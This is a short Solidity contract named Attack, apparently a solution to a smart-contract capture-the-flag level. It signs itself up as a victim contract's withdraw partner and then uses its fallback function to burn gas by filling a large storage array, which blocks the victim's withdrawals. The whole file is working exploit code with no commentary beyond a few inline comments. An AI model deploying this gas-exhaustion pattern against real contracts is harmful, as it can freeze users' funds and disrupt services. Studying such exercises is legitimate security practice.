// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial{
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract Attack {
    IDenial victim;
    uint[40000] public array;
    constructor(address _victim) {
        victim = IDenial(_victim); // initilizating the victim interface
    }
    
    function attack() public {
        victim.setWithdrawPartner(address(this)); // sign as the withdraw partner
        victim.withdraw();
    }

    fallback() external payable {
        for(uint i = 0; i< 40000; i++) {
            array[i] = i; // fill the storage array which consumes a lot of gas
        }
    }

}
